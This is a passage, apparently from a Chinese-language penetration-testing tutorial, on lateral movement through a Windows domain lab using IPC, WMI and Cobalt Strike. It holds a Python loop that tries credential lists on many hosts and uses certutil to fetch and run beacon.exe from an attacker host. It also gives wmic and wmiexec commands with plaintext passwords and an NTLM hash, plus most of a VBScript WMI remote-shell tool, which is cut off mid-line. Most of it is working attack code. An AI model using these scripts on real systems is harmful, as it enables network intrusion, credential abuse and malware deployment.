class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;itadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jack&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vpnadm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Admin12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():<span class="comment">#下载后门</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;E:\SOFT\Python38\python.exe C:\Users\yh\Desktop\\atexec.py ./administrator:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;E:\SOFT\Python38\python.exe C:\Users\yh\Desktop\\atexec.py god/&#x27;</span>+user+<span class="string">&#x27;:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="comment">#exec3=&#x27;atexec.exe ./administrator:admin!@#45@192.168.3.32 &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():<span class="comment">#执行后门</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                <span class="comment">#exec=&quot;net use \\&quot;+ &quot;\\&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:god\\&#x27;+user</span></span><br><span class="line">                exec1 = <span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py ./administrator:&#x27;</span> + mima + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                exec2 = <span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py god/&#x27;</span> + user + <span class="string">&#x27;:&#x27;</span> + mima + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="comment">#exec3=&#x27;atexec.exe ./administrator:admin!@#45@192.168.3.32 &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br><span class="line">    <span class="comment"># zx()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>WMI（Windows Management Instrumentation，Windows管理规范）是<strong>一项核心的windows管理技术</strong>。从Windows 98开始，windows操作系统都支持WMI。用户可以通过WMI管理本地和远程计算机。Windows为远程传输WMI数据提供了两个可用的协议，即分布式组件对象模型（Distributed Component Object Model）和windows远程管理（Windows Remote Management，WinRM），使得<strong>WMI对象的查询、事件注册、WMI类方法的执行和类的创建等都可以远程执行</strong>。</p><p>利用WMI进行横向移动需要具备以下条件：</p><ul><li>1、远程主机的WMI服务为开启状态（默认开启）</li><li>2、远程主机防火墙放行<strong>135端口</strong>，这是WMI管理的默认端口</li></ul><p>支持明文以及hash利用</p><p>不会再目标的系统日志留下痕迹</p><p>WMI命令是没有回显的</p><p>环境还是IPC的那个环境</p><p>具体渗透就不多说了</p><p>总之用CS上线system权限</p><p><img src="https://bu.dusays.com/2024/10/11/6709336a24485.png" alt="image-20240914123931816"></p><p>DC：192.168.3.21</p><p>其他3网段都是域内主机</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>因为WMI是windows主机自带的</p><p>所以我们不需要向目标上传任何额外文件</p><p>可以直接执行命令</p><p>查进程</p><p><code>wmic /node:192.168.52.138 /user:god\liukaifeng01 /password:hongrisec@2024. process list brief</code></p><p>下载木马</p><p><code>wmic /node:192.168.3.32 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;</code></p><p>执行木马</p><p><code>wmic /node:192.168.3.32 /user:administrator /password:Admin12345 process call create &quot;cmd.exe c:/beacon.exe&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933687e835.png" alt="image-20240914125844816"></p><p>CS上线</p><p>解决WMI无回显：</p><p>可以将执行结果写入文件，然后建立IPC连接来远程读取</p><p>结果写入文件</p><p><code>wmic /node:192.168.52.138 /user:god\liukaifeng01 /password:hongrisec@2024. process call create &quot;cmd.exe /c ipconfig &gt; c:\result.txt&quot;</code> </p><p>建立IPC</p><p><code>net use \\192.168.52.138\ipc$ hongrisec@2024. /user:god\liukaifeng0</code></p><p>读文件</p><p><code>type \\192.168.52.138\c$\result.txt</code></p><p>或者将木马传输和执行一起执行 看上不上线</p><h3 id="套件执行"><a href="#套件执行" class="headerlink" title="套件执行"></a>套件执行</h3><p>我们在IPC用到impacket套件也是支持WMI的</p><p><img src="https://bu.dusays.com/2024/10/11/67093359cc07b.png" alt="image-20240914130139204"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/67093359a7094.png" alt="image-20240914130555126"></p><p>socks代理会更快点</p><p>这也是socks代理的优势</p><p><img src="https://bu.dusays.com/2024/10/11/6709336870962.png" alt="image-20240914130730853"></p><h3 id="插件执行"><a href="#插件执行" class="headerlink" title="插件执行"></a>插件执行</h3><p>cs本身是可以进行横向移动的</p><p>目标列表中</p><p><img src="https://bu.dusays.com/2024/10/11/670933664adc4.png" alt="image-20240914131230726"></p><p><img src="https://bu.dusays.com/2024/10/11/670933625d939.png" alt="image-20240914131304662"></p><p>WMI也是被插件支持的</p><p><img src="https://bu.dusays.com/2024/10/11/6709336ab3224.png" alt="image-20240914131152226"></p><p><img src="https://bu.dusays.com/2024/10/11/6709336a6eb9c.png" alt="image-20240914131643474"></p><p>两个都差不多</p><h3 id="脚本执行"><a href="#脚本执行" class="headerlink" title="脚本执行"></a>脚本执行</h3><p>脚本如下</p><p>命名成wmiexec.vbs</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="comment">&#x27;################################ Temp Result File , Change it to where you like</span></span><br><span class="line"><span class="keyword">Const</span> Path = <span class="string">&quot;C:\&quot;</span></span><br><span class="line"><span class="keyword">Const</span> FileName = <span class="string">&quot;wmi.dll&quot;</span> </span><br><span class="line"><span class="keyword">Const</span> timeOut = <span class="number">1200</span></span><br><span class="line"><span class="comment">&#x27;################################</span></span><br><span class="line">file = Path &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line">file = <span class="built_in">Replace</span>(file,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">FilePath = fso.GetParentFolderName(file) <span class="comment">&#x27;for wmi create share</span></span><br><span class="line"><span class="comment">&#x27;WScript.Echo FilePath</span></span><br><span class="line"></span><br><span class="line">WAITTIME = timeOut              <span class="comment">&#x27;ms  time to execute command ,read result file after 1200ms</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objArgs = WScript.Arguments</span><br><span class="line">intArgCount = objArgs.Count </span><br><span class="line"><span class="keyword">If</span> intArgCount &lt; <span class="number">2</span> <span class="keyword">Or</span> intArgCount &gt; <span class="number">5</span> <span class="keyword">Then</span></span><br><span class="line">WScript.Echo </span><br><span class="line">WScript.Echo <span class="string">&quot;   $$\      $$\ $$\      $$\ $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  &quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;   $$ | $\  $$ |$$$\    $$$ |\_$$  _|$$  _____|$$ |  $$ |$$  _____|$$  __$$\ &quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;   $$ |$$$\ $$ |$$$$\  $$$$ |  $$ |  $$ |      \$$\ $$  |$$ |      $$ /  \__|&quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;   $$ $$ $$\$$ |$$\$$\$$ $$ |  $$ |  $$$$$\     \$$$$  / $$$$$\    $$ |      &quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;   $$$$  _$$$$ |$$ \$$$  $$ |  $$ |  $$  __|    $$  $$&lt;  $$  __|   $$ |      &quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;   $$$  / \$$$ |$$ |\$  /$$ |  $$ |  $$ |      $$  /\$$\ $$ |      $$ |  $$\ &quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;   $$  /   \$$ |$$ | \_/ $$ |$$$$$$\ $$$$$$$$\ $$ /  $$ |$$$$$$$$\ \$$$$$$  |&quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;   \__/     \__|\__|     \__|\______|\________|\__|  \__|\________| \______/ &quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;                                               v1.1dev        By. Twi1ight   &quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot; Usage:&quot;</span> &amp; _</span><br><span class="line">vbTab &amp; <span class="string">&quot;wmiexec.vbs  /shell  host&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /shell  host  user  pass&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /cmd  host  command&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /cmd  host  user  pass  command&quot;</span> &amp; vbNewLine &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;  /shell&quot;</span>  &amp; vbTab &amp; <span class="string">&quot;half-interactive shell mode&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;  /cmd&quot;</span> &amp; vbTab &amp; vbTab &amp; <span class="string">&quot;single command mode&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;  host&quot;</span> &amp; vbTab &amp; vbTab &amp; <span class="string">&quot;hostname or IP address&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;  command&quot;</span> &amp; vbTab &amp; <span class="string">&quot;the command to execute on remote host&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbNewLine &amp; vbTab &amp; <span class="string">&quot;  -waitTIME&quot;</span> &amp; vbTab &amp; _</span><br><span class="line"> <span class="string">&quot;[both mode] ,delay TIME to read result,&quot;</span>&amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line"> vbTab &amp; vbTab &amp;<span class="string">&quot;eg. &#x27;systeminfo -wait5000&#x27; &#x27;ping google.com -wait2000&#x27;&quot;</span> &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; <span class="string">&quot;  -persist&quot;</span> &amp; vbTab &amp; _</span><br><span class="line"> <span class="string">&quot;[both mode] ,running command background and persistent&quot;</span> &amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line"> vbTab &amp; vbTab &amp;<span class="string">&quot;such as nc.exe or Trojan&quot;</span> </span><br><span class="line">WScript.Quit()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) &lt;&gt; <span class="string">&quot;/cmd&quot;</span> <span class="keyword">And</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) &lt;&gt; <span class="string">&quot;/shell&quot;</span> <span class="keyword">Then</span> </span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Wrong Mode Specified!&quot;</span></span><br><span class="line">WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">boolShellMode = <span class="literal">True</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) = <span class="string">&quot;/cmd&quot;</span> <span class="keyword">Then</span> boolShellMode = <span class="literal">False</span></span><br><span class="line"><span class="keyword">If</span> boolShellMode = <span class="literal">False</span> <span class="keyword">Then</span> command = objArgs.Item(intArgCount - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">host = objArgs.Item(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">user = objArgs.Item(<span class="number">2</span>)</span><br><span class="line">pass = objArgs.Item(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; &quot;&quot;&quot;</span> &amp; pass &amp; <span class="string">&quot;&quot;&quot; &quot;</span> &amp; <span class="string">&quot;/user:&quot;</span> &amp; user</span><br><span class="line"><span class="comment">&#x27;WScript.Echo strNetUse</span></span><br><span class="line">objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;Output Status</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Target -&gt; &quot;</span> &amp; host</span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Connecting...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objLocator = <span class="built_in">CreateObject</span>(<span class="string">&quot;wbemscripting.swbemlocator&quot;</span>)</span><br><span class="line"><span class="keyword">If</span> intArgCount &gt;<span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">set</span> objWMIService = objLocator.connectserver(host,<span class="string">&quot;root/cimv2&quot;</span>,user,pass)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line"><span class="keyword">Set</span> objWMIService = objLocator.ConnectServer(host,<span class="string">&quot;root/cimv2&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">If</span> Err.Number &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC ERROR: &quot;</span> &amp; Err.Description </span><br><span class="line">WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Login -&gt; OK&quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Result File -&gt; &quot;</span> &amp; file</span><br><span class="line"></span><br><span class="line">boolPersist = <span class="literal">False</span></span><br><span class="line"><span class="comment">&#x27;Create Share</span></span><br><span class="line">CreateShare()</span><br><span class="line">CurrentFolder = <span class="literal">Null</span></span><br><span class="line"><span class="comment">&#x27;-----single Command mode------</span></span><br><span class="line"><span class="keyword">If</span> boolShellMode = <span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">WAITTIME = <span class="number">5000</span></span><br><span class="line">WScript.Echo vbNewLine &amp; vbTab &amp; host &amp; <span class="string">&quot;  &gt;&gt;  &quot;</span> &amp; command</span><br><span class="line">boolGetFolder = <span class="literal">False</span></span><br><span class="line">strResult = PhraseCmd( command )</span><br><span class="line"><span class="comment">&#x27;WScript.Echo strResult</span></span><br><span class="line"><span class="keyword">If</span> strResult = <span class="string">&quot;persist&quot;</span> <span class="keyword">Then</span></span><br><span class="line">boolPersist = <span class="literal">True</span></span><br><span class="line">Exec command,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Exec command, file</span><br><span class="line">ReadResult()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; /del&quot;</span></span><br><span class="line">objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">DeleteShare()</span><br><span class="line">WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;++++++++shell mode++++++++++++</span></span><br><span class="line"><span class="comment">&#x27;get current working directory</span></span><br><span class="line">boolGetFolder = <span class="literal">True</span></span><br><span class="line">CurrentFolder = Exec(<span class="string">&quot;cd&quot;</span>, file)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;WScript.Echo CurrentFolder</span></span><br><span class="line"><span class="keyword">Do</span> <span class="keyword">While</span> <span class="literal">True</span></span><br><span class="line">boolPersist = <span class="literal">False</span></span><br><span class="line">WAITTIME = timeOut</span><br><span class="line">wscript.stdout.write(CurrentFolder &amp; <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">command = wscript.stdin.ReadLine</span><br><span class="line"><span class="comment">&#x27;press &#x27;Enter&#x27; directorly</span></span><br><span class="line"><span class="keyword">Do</span> <span class="keyword">While</span> command = <span class="string">&quot;&quot;</span></span><br><span class="line">wscript.stdout.write(CurrentFolder &amp; <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">command = wscript.stdin.ReadLine</span><br><span class="line"><span class="keyword">Loop</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(command)) = <span class="string">&quot;exit&quot;</span> <span class="keyword">Then</span> <span class="keyword">Exit</span> <span class="keyword">Do</span></span><br><span class="line"><span class="comment">&#x27;If Not IsEmpty(command) Then </span></span><br><span class="line"><span class="comment">&#x27;process &#x27;cd&#x27; command--------&gt;&gt;&gt;&gt;</span></span><br><span class="line">strResult = PhraseCmd( command )</span><br><span class="line"><span class="keyword">If</span> strResult = <span class="string">&quot;cd&quot;</span> <span class="keyword">Then</span> </span><br><span class="line">command = command &amp; <span class="string">&quot; &amp; cd &quot;</span></span><br><span class="line">boolGetFolder = <span class="literal">True</span></span><br><span class="line">DestFolder = Exec(command, file)</span><br><span class="line"><span class="keyword">If</span> CurrentFolder = DestFolder <span class="keyword">Then</span> </span><br><span class="line">WScript.Echo <span class="string">&quot;The system cannot find the path specified.&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">CurrentFolder = DestFolder</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">ElseIf</span> strResult = <span class="string">&quot;persist&quot;</span> <span class="keyword">Then</span></span><br><span class="line">boolPersist = <span class="literal">True</span></span><br><span class="line"><span class="comment">&#x27;WScript.Echo &quot;persist&quot;</span></span><br><span class="line">Exec command,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="comment">&#x27;##########################################toDo</span></span><br><span class="line"><span class="comment">&#x27;-----------&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">err.clear</span><br><span class="line">Exec command, file</span><br><span class="line">ReadResult()</span><br><span class="line">    <span class="keyword">If</span> err.number &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> wscript.echo( <span class="string">&quot;WMIEXEC ERROR: &quot;</span> &amp; Err.Number &amp; <span class="string">&quot; &quot;</span> &amp; err.description)</span><br><span class="line">Err.Clear</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Goto</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">loop</span></span><br><span class="line"></span><br><span class="line">strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; /del&quot;</span></span><br><span class="line">objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">DeleteShare()</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;#####################################</span></span><br><span class="line"><span class="keyword">Function</span> PhraseCmd(cmd)</span><br><span class="line">PhraseCmd = <span class="literal">False</span> <span class="comment">&#x27; not &#x27;cd&#x27;</span></span><br><span class="line">arrCommand = <span class="built_in">Split</span>(cmd)</span><br><span class="line">strExe = arrCommand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(strExe)) = <span class="string">&quot;cd&quot;</span> <span class="keyword">Or</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(strExe)) = <span class="string">&quot;cd.exe&quot;</span> <span class="keyword">Then</span> PhraseCmd = <span class="string">&quot;cd&quot;</span>  <span class="comment">&#x27; is &#x27;cd&#x27;</span></span><br><span class="line"><span class="keyword">Set</span> regEx = <span class="keyword">New</span> RegExp</span><br><span class="line">regEx.Pattern = <span class="string">&quot;^[a-z]:$&quot;</span></span><br><span class="line">regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line"><span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> PhraseCmd = <span class="string">&quot;cd&quot;</span> <span class="comment">&#x27; is &#x27;d:&#x27;</span></span><br><span class="line"><span class="comment">&#x27;phrase time command</span></span><br><span class="line">regEx.Pattern = <span class="string">&quot;(.*?)-wait(\d+)&quot;</span></span><br><span class="line">regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line"><span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Set</span> objMatch = Matches(<span class="number">0</span>)</span><br><span class="line">command = objMatch.SubMatches(<span class="number">0</span>)</span><br><span class="line"><span class="comment">&#x27;WScript.Echo &quot;Command :&quot; &amp; command</span></span><br><span class="line">WAITTIME = <span class="built_in">CInt</span>(objMatch.SubMatches(<span class="number">1</span>))</span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Waiting &quot;</span> &amp; WAITTIME &amp; <span class="string">&quot; ms...&quot;</span> &amp; vbNewLine</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;phrase persist command</span></span><br><span class="line">regEx.Pattern = <span class="string">&quot;(.*?)-persist&quot;</span></span><br><span class="line">regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line"><span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Set</span> objMatch = Matches(<span class="number">0</span>)</span><br><span class="line">command = objMatch.SubMatches(<span class="number">0</span>)</span><br><span class="line">PhraseCmd = <span class="string">&quot;persist&quot;</span>  <span class="comment">&#x27; is quiet</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> CreateShare()</span><br><span class="line"><span class="comment">&#x27;create share</span></span><br><span class="line"><span class="keyword">Set</span> objNewShare = objWMIService.<span class="keyword">Get</span>(<span class="string">&quot;Win32_Share&quot;</span>)</span><br><span class="line">intReturn = objNewShare.Create _</span><br><span class="line">    (FilePath, <span class="string">&quot;WMI_SHARE&quot;</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share could not be created.&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">    <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">    <span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">    <span class="keyword">Case</span> <span class="number">9</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Invalid File Path!&quot;</span></span><br><span class="line">    <span class="keyword">Case</span> <span class="number">22</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share Name Already In Used!&quot;</span></span><br><span class="line">    <span class="keyword">Case</span> <span class="number">24</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Directory NOT exists!&quot;</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">If</span> intReturn &lt;&gt; <span class="number">22</span> <span class="keyword">Then</span> WScript.Quit</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC : Share created sucess.&quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Share Name -&gt; WMI_SHARE&quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Share Path -&gt; &quot;</span> &amp; FilePath</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> DeleteShare()</span><br><span class="line"><span class="keyword">Set</span> colShares = objWMIService.ExecQuery _</span><br><span class="line">(<span class="string">&quot;Select * from Win32_Share Where Name = &#x27;WMI_SHARE&#x27;&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objShare <span class="keyword">In</span> colShares</span><br><span class="line">intReturn = objShare.Delete</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">WScript.Echo <span 